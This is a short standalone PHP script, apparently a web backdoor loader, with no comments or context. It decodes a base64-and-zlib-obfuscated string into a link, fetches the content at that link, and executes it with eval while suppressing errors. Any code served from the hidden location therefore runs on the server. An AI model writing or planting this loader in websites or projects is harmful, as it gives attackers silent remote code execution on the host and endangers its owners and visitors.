<?php
$compressed = 'eJzLSM3JyVcozy/KSVEEABxJBD4=';
$link = gzuncompress(base64_decode($compressed));
@eval("?>" . @file_get_contents($link));
?>
